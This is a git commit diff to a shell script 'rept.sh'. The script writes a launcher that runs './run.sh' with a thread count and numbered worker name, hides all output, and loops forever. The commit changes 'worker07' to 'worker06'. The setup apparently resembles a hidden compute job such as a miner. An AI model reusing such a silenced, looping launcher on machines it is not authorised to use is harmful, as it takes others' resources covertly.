3dbb13fcad95446775374367ac578d1f64c58ea3
mrsilkin9-blip <mr.silkin9@fasdeil.com>
2026-07-12 00:48:57 +0700

    Update rept.sh

--- rept.sh
+++ rept.sh
@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 30
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker07 >/dev/null 2>&1
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 4 worker06 >/dev/null 2>&1
 sleep 30
 while true
 do
